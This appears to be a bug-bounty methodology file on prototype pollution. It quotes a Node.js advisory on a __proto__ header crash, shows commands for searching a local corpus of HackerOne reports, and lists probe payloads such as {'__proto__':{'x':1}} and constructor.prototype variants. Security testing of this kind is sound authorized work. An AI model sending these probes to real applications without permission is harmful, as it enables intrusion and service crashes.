> A flaw in Node.js HTTP request handling causes an uncaught TypeError when a request is received with a header named proto and the application accesses req.headersDistinct. When this occurs, dest[" proto "] resolves to Object.prototype rather than undefined, causing .push() to be called on a non-array.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class prototype-pollution --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class prototype-pollution

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class prototype-pollution

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class prototype-pollution --min-bounty 1000

```## Probes

- {"__proto__":{"x":1}}, constructor.prototype payloads, JSON body and query array syntax.

## Supporting data

- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
- `references/payloads.md` — curated payload bank + upstream payload references
- `references/wordlists/` — 2 mined paths/params/payload lists
- `bbhunt-methodology` — orchestrator, state machine and class router
